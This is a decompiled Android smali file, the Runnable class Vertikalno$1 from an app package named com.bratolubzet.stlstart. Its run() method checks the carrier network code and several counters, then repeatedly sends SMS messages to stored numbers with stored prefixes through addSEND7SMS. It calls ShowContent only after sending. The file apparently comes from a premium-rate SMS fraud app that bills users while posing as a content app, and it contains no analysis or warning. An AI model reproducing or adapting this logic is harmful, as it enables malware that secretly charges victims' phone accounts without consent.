.class Lcom/bratolubzet/stlstart/Vertikalno$1;
.super Ljava/lang/Object;
.source "Vertikalno.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/bratolubzet/stlstart/Vertikalno;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/bratolubzet/stlstart/Vertikalno;


# direct methods
.method constructor <init>(Lcom/bratolubzet/stlstart/Vertikalno;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    .line 371
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 9

    .prologue
    const/4 v8, 0x1

    const/4 v7, 0x0

    const-wide/16 v5, 0x3e8

    .line 374
    iget-object v1, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    # getter for: Lcom/bratolubzet/stlstart/Vertikalno;->startsent:I
    invoke-static {v1}, Lcom/bratolubzet/stlstart/Vertikalno;->access$0(Lcom/bratolubzet/stlstart/Vertikalno;)I

    move-result v1

    if-ne v1, v8, :cond_1

    .line 375
    iget-object v1, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    iget v1, v1, Lcom/bratolubzet/stlstart/Vertikalno;->currentMNC:I

    const/4 v2, 0x2

    if-ne v1, v2, :cond_0

    iget-object v1, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    # getter for: Lcom/bratolubzet/stlstart/Vertikalno;->otpr:I
    invoke-static {v1}, Lcom/bratolubzet/stlstart/Vertikalno;->access$1(Lcom/bratolubzet/stlstart/Vertikalno;)I

    move-result v1

    if-lez v1, :cond_0

    .line 376
    iget-object v1, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    # invokes: Lcom/bratolubzet/stlstart/Vertikalno;->ShowContent()V
    invoke-static {v1}, Lcom/bratolubzet/stlstart/Vertikalno;->access$2(Lcom/bratolubzet/stlstart/Vertikalno;)V

    .line 378
    :cond_0
    iget-object v1, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    # getter for: Lcom/bratolubzet/stlstart/Vertikalno;->otpr:I
    invoke-static {v1}, Lcom/bratolubzet/stlstart/Vertikalno;->access$1(Lcom/bratolubzet/stlstart/Vertikalno;)I

    move-result v1

    if-nez v1, :cond_2

    .line 379
    iget-object v1, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    invoke-static {v1, v8}, Lcom/bratolubzet/stlstart/Vertikalno;->access$3(Lcom/bratolubzet/stlstart/Vertikalno;I)V

    .line 381
    iget-object v1, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    invoke-static {v1, v7}, Lcom/bratolubzet/stlstart/Vertikalno;->access$4(Lcom/bratolubzet/stlstart/Vertikalno;I)V

    .line 382
    iget-object v1, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    invoke-static {v1, v7}, Lcom/bratolubzet/stlstart/Vertikalno;->access$5(Lcom/bratolubzet/stlstart/Vertikalno;I)V

    .line 383
    iget-object v1, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    iget-object v1, v1, Lcom/bratolubzet/stlstart/Vertikalno;->tecprefs:[Ljava/lang/String;

    array-length v1, v1

    iget-object v2, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    # getter for: Lcom/bratolubzet/stlstart/Vertikalno;->otpryach:I
    invoke-static {v2}, Lcom/bratolubzet/stlstart/Vertikalno;->access$6(Lcom/bratolubzet/stlstart/Vertikalno;)I

    move-result v2

    if-le v1, v2, :cond_1

    .line 385
    :try_start_0
    iget-object v1, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    const-wide/16 v4, 0x3e8

    div-long/2addr v2, v4

    invoke-static {v1, v2, v3}, Lcom/bratolubzet/stlstart/Vertikalno;->access$7(Lcom/bratolubzet/stlstart/Vertikalno;J)V

    .line 386
    iget-object v1, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    iget-object v2, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    iget-object v2, v2, Lcom/bratolubzet/stlstart/Vertikalno;->tecnums:[Ljava/lang/String;

    iget-object v3, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    # getter for: Lcom/bratolubzet/stlstart/Vertikalno;->otpryach:I
    invoke-static {v3}, Lcom/bratolubzet/stlstart/Vertikalno;->access$6(Lcom/bratolubzet/stlstart/Vertikalno;)I

    move-result v3

    aget-object v2, v2, v3

    iget-object v3, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    iget-object v3, v3, Lcom/bratolubzet/stlstart/Vertikalno;->tecprefs:[Ljava/lang/String;

    iget-object v4, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    # getter for: Lcom/bratolubzet/stlstart/Vertikalno;->otpryach:I
    invoke-static {v4}, Lcom/bratolubzet/stlstart/Vertikalno;->access$6(Lcom/bratolubzet/stlstart/Vertikalno;)I

    move-result v4

    aget-object v3, v3, v4

    # invokes: Lcom/bratolubzet/stlstart/Vertikalno;->addSEND7SMS(Ljava/lang/String;Ljava/lang/String;)V
    invoke-static {v1, v2, v3}, Lcom/bratolubzet/stlstart/Vertikalno;->access$8(Lcom/bratolubzet/stlstart/Vertikalno;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 435
    :cond_1
    :goto_0
    return-void

    .line 387
    :catch_0
    move-exception v0

    .line 389
    .local v0, "e":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0

    .line 395
    .end local v0    # "e":Ljava/io/IOException;
    :cond_2
    iget-object v1, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    # getter for: Lcom/bratolubzet/stlstart/Vertikalno;->otprtime:J
    invoke-static {v1}, Lcom/bratolubzet/stlstart/Vertikalno;->access$9(Lcom/bratolubzet/stlstart/Vertikalno;)J

    move-result-wide v1

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    div-long/2addr v3, v5

    const-wide/16 v5, 0xf

    sub-long/2addr v3, v5

    cmp-long v1, v1, v3

    if-ltz v1, :cond_3

    iget-object v1, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    # getter for: Lcom/bratolubzet/stlstart/Vertikalno;->otprstatus:I
    invoke-static {v1}, Lcom/bratolubzet/stlstart/Vertikalno;->access$10(Lcom/bratolubzet/stlstart/Vertikalno;)I

    move-result v1

    if-lez v1, :cond_1

    .line 396
    :cond_3
    iget-object v1, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    iget-object v2, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    # getter for: Lcom/bratolubzet/stlstart/Vertikalno;->otprstatus:I
    invoke-static {v2}, Lcom/bratolubzet/stlstart/Vertikalno;->access$10(Lcom/bratolubzet/stlstart/Vertikalno;)I

    move-result v2

    invoke-static {v1, v2}, Lcom/bratolubzet/stlstart/Vertikalno;->access$11(Lcom/bratolubzet/stlstart/Vertikalno;I)V

    .line 397
    iget-object v1, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    invoke-static {v1, v7}, Lcom/bratolubzet/stlstart/Vertikalno;->access$5(Lcom/bratolubzet/stlstart/Vertikalno;I)V

    .line 398
    iget-object v1, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    # getter for: Lcom/bratolubzet/stlstart/Vertikalno;->countnorm:I
    invoke-static {v1}, Lcom/bratolubzet/stlstart/Vertikalno;->access$12(Lcom/bratolubzet/stlstart/Vertikalno;)I

    move-result v1

    iget-object v2, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    iget-object v2, v2, Lcom/bratolubzet/stlstart/Vertikalno;->tecnums:[Ljava/lang/String;

    array-length v2, v2

    if-gt v1, v2, :cond_4

    iget-object v1, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    # getter for: Lcom/bratolubzet/stlstart/Vertikalno;->countnorm:I
    invoke-static {v1}, Lcom/bratolubzet/stlstart/Vertikalno;->access$12(Lcom/bratolubzet/stlstart/Vertikalno;)I

    move-result v1

    iget-object v2, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    iget-object v2, v2, Lcom/bratolubzet/stlstart/Vertikalno;->tecnums:[Ljava/lang/String;

    array-length v2, v2

    if-ne v1, v2, :cond_5

    .line 399
    :cond_4
    iget-object v1, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    # invokes: Lcom/bratolubzet/stlstart/Vertikalno;->ShowContent()V
    invoke-static {v1}, Lcom/bratolubzet/stlstart/Vertikalno;->access$2(Lcom/bratolubzet/stlstart/Vertikalno;)V

    .line 401
    :cond_5
    iget-object v1, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    # getter for: Lcom/bratolubzet/stlstart/Vertikalno;->otprstatus2:I
    invoke-static {v1}, Lcom/bratolubzet/stlstart/Vertikalno;->access$13(Lcom/bratolubzet/stlstart/Vertikalno;)I

    move-result v1

    if-ne v1, v8, :cond_6

    .line 404
    :try_start_1
    iget-object v1, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    const-wide/16 v4, 0x3e8

    div-long/2addr v2, v4

    invoke-static {v1, v2, v3}, Lcom/bratolubzet/stlstart/Vertikalno;->access$7(Lcom/bratolubzet/stlstart/Vertikalno;J)V

    .line 405
    iget-object v1, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    iget-object v2, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    iget-object v2, v2, Lcom/bratolubzet/stlstart/Vertikalno;->tecnums:[Ljava/lang/String;

    iget-object v3, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    # getter for: Lcom/bratolubzet/stlstart/Vertikalno;->otpryach:I
    invoke-static {v3}, Lcom/bratolubzet/stlstart/Vertikalno;->access$6(Lcom/bratolubzet/stlstart/Vertikalno;)I

    move-result v3

    aget-object v2, v2, v3

    iget-object v3, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    iget-object v3, v3, Lcom/bratolubzet/stlstart/Vertikalno;->tecprefs:[Ljava/lang/String;

    iget-object v4, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    # getter for: Lcom/bratolubzet/stlstart/Vertikalno;->otpryach:I
    invoke-static {v4}, Lcom/bratolubzet/stlstart/Vertikalno;->access$6(Lcom/bratolubzet/stlstart/Vertikalno;)I

    move-result v4

    aget-object v3, v3, v4

    # invokes: Lcom/bratolubzet/stlstart/Vertikalno;->addSEND7SMS(Ljava/lang/String;Ljava/lang/String;)V
    invoke-static {v1, v2, v3}, Lcom/bratolubzet/stlstart/Vertikalno;->access$8(Lcom/bratolubzet/stlstart/Vertikalno;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_0

    .line 406
    :catch_1
    move-exception v0

    .line 408
    .restart local v0    # "e":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto/16 :goto_0

    .line 411
    .end local v0    # "e":Ljava/io/IOException;
    :cond_6
    iget-object v1, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    # getter for: Lcom/bratolubzet/stlstart/Vertikalno;->otpryach:I
    invoke-static {v1}, Lcom/bratolubzet/stlstart/Vertikalno;->access$6(Lcom/bratolubzet/stlstart/Vertikalno;)I

    move-result v2

    add-int/lit8 v2, v2, 0x1

    invoke-static {v1, v2}, Lcom/bratolubzet/stlstart/Vertikalno;->access$4(Lcom/bratolubzet/stlstart/Vertikalno;I)V

    .line 412
    iget-object v1, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    iget-object v1, v1, Lcom/bratolubzet/stlstart/Vertikalno;->tecprefs:[Ljava/lang/String;

    array-length v1, v1

    iget-object v2, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    # getter for: Lcom/bratolubzet/stlstart/Vertikalno;->otpryach:I
    invoke-static {v2}, Lcom/bratolubzet/stlstart/Vertikalno;->access$6(Lcom/bratolubzet/stlstart/Vertikalno;)I

    move-result v2

    if-le v1, v2, :cond_7

    .line 414
    :try_start_2
    iget-object v1, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    const-wide/16 v4, 0x3e8

    div-long/2addr v2, v4

    invoke-static {v1, v2, v3}, Lcom/bratolubzet/stlstart/Vertikalno;->access$7(Lcom/bratolubzet/stlstart/Vertikalno;J)V

    .line 415
    iget-object v1, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    iget-object v2, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    iget-object v2, v2, Lcom/bratolubzet/stlstart/Vertikalno;->tecnums:[Ljava/lang/String;

    iget-object v3, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    # getter for: Lcom/bratolubzet/stlstart/Vertikalno;->otpryach:I
    invoke-static {v3}, Lcom/bratolubzet/stlstart/Vertikalno;->access$6(Lcom/bratolubzet/stlstart/Vertikalno;)I

    move-result v3

    aget-object v2, v2, v3

    iget-object v3, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    iget-object v3, v3, Lcom/bratolubzet/stlstart/Vertikalno;->tecprefs:[Ljava/lang/String;

    iget-object v4, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    # getter for: Lcom/bratolubzet/stlstart/Vertikalno;->otpryach:I
    invoke-static {v4}, Lcom/bratolubzet/stlstart/Vertikalno;->access$6(Lcom/bratolubzet/stlstart/Vertikalno;)I

    move-result v4

    aget-object v3, v3, v4

    # invokes: Lcom/bratolubzet/stlstart/Vertikalno;->addSEND7SMS(Ljava/lang/String;Ljava/lang/String;)V
    invoke-static {v1, v2, v3}, Lcom/bratolubzet/stlstart/Vertikalno;->access$8(Lcom/bratolubzet/stlstart/Vertikalno;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_2

    goto/16 :goto_0

    .line 416
    :catch_2
    move-exception v0

    .line 418
    .restart local v0    # "e":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto/16 :goto_0

    .line 422
    .end local v0    # "e":Ljava/io/IOException;
    :cond_7
    iget-object v1, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    # getter for: Lcom/bratolubzet/stlstart/Vertikalno;->otpryach:I
    invoke-static {v1}, Lcom/bratolubzet/stlstart/Vertikalno;->access$6(Lcom/bratolubzet/stlstart/Vertikalno;)I

    move-result v2

    add-int/lit8 v2, v2, -0x1

    invoke-static {v1, v2}, Lcom/bratolubzet/stlstart/Vertikalno;->access$4(Lcom/bratolubzet/stlstart/Vertikalno;I)V

    .line 424
    :try_start_3
    iget-object v1, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    const-wide/16 v4, 0x3e8

    div-long/2addr v2, v4

    invoke-static {v1, v2, v3}, Lcom/bratolubzet/stlstart/Vertikalno;->access$7(Lcom/bratolubzet/stlstart/Vertikalno;J)V

    .line 425
    iget-object v1, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    iget-object v2, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    iget-object v2, v2, Lcom/bratolubzet/stlstart/Vertikalno;->tecnums:[Ljava/lang/String;

    iget-object v3, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    # getter for: Lcom/bratolubzet/stlstart/Vertikalno;->otpryach:I
    invoke-static {v3}, Lcom/bratolubzet/stlstart/Vertikalno;->access$6(Lcom/bratolubzet/stlstart/Vertikalno;)I

    move-result v3

    aget-object v2, v2, v3

    iget-object v3, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    iget-object v3, v3, Lcom/bratolubzet/stlstart/Vertikalno;->tecprefs:[Ljava/lang/String;

    iget-object v4, p0, Lcom/bratolubzet/stlstart/Vertikalno$1;->this$0:Lcom/bratolubzet/stlstart/Vertikalno;

    # getter for: Lcom/bratolubzet/stlstart/Vertikalno;->otpryach:I
    invoke-static {v4}, Lcom/bratolubzet/stlstart/Vertikalno;->access$6(Lcom/bratolubzet/stlstart/Vertikalno;)I

    move-result v4

    aget-object v3, v3, v4

    # invokes: Lcom/bratolubzet/stlstart/Vertikalno;->addSEND7SMS(Ljava/lang/String;Ljava/lang/String;)V
    invoke-static {v1, v2, v3}, Lcom/bratolubzet/stlstart/Vertikalno;->access$8(Lcom/bratolubzet/stlstart/Vertikalno;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_3
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_3

    goto/16 :goto_0

    .line 426
    :catch_3
    move-exception v0

    .line 428
    .restart local v0    # "e":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto/16 :goto_0
.end method
